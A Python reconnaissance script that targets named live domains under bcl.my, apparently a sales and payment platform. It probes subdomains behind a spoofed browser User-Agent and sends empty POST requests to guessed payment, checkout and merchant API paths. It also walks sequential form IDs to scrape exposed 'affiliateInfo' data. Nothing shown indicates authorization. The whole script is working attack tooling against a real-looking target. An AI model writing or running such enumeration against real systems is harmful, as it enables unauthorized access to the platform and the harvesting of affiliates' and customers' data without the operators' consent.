import requests, re, json

s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

# 1. Check discovered subdomains
print('=== Subdomain Check ===')
for sub in ['docs.bcl.my', 'main.bcl.my', 'portal.bcl.my', 'api.bcl.my', 'app.bcl.my']:
    try:
        r = s.get(f'https://{sub}/', timeout=10)
        title = re.search(r'<title>([^<]+)</title>', r.text)
        t = title.group(1)[:60] if title else 'no title'
        print(f'  {sub}: {r.status_code} -> {t}')
    except Exception as e:
        print(f'  {sub}: ERROR - {str(e)[:50]}')

# 2. Check for portal subdomain on same IP
print('\n=== Portal/App subdomains ===')
for sub in ['portal', 'app', 'pay', 'api']:
    r = s.get(f'https://{sub}.caliphempire.bcl.my/', timeout=10)
    if r.status_code != 404:
        print(f'  {sub}.caliphempire.bcl.my: {r.status_code}')

# 3. Check docs.bcl.my
print('\n=== docs.bcl.my ===')
r = s.get('https://docs.bcl.my/', timeout=15)
print(f'Status: {r.status_code}')
print(f'First 1000 chars: {r.text[:1000]}')

# 4. Check main.bcl.my  
print('\n=== main.bcl.my ===')
r = s.get('https://main.bcl.my/', timeout=15)
print(f'Status: {r.status_code}')
if r.status_code == 200:
    # Extract useful info
    links = re.findall(r'href="([^"]*)"', r.text)
    print('Links:')
    for l in links[:20]:
        if 'bcl.my' in l or l.startswith('/'):
            print(f'  {l}')

# 5. Check if there's a payment API
print('\n=== Payment API ===')
for path in ['/api/payment', '/api/payments', '/api/transaction', '/api/checkout',
             '/api/webhook', '/api/merchant', '/api/v1/payment', '/api/v1/checkout']:
    r = s.post(f'https://caliphempire.bcl.my{path}', json={}, timeout=10)
    if r.status_code not in [404, 405]:
        print(f'  {path}: {r.status_code} - {r.text[:200]}')

# 6. Check for exposed affiliate list
print('\n=== Merchant/Form enumeration ===')
for fid in range(7760, 7775):
    try:
        r = s.get(f'https://caliphempire.bcl.my/form/tiktok-sales-sniper/{fid}', timeout=10)
        if r.status_code == 200:
            aff = re.search(r'affiliateInfo[^]]+\]', r.text)
            if aff:
                print(f'  Form {fid}: DATA! {aff.group()[:200]}')
    except:
        pass
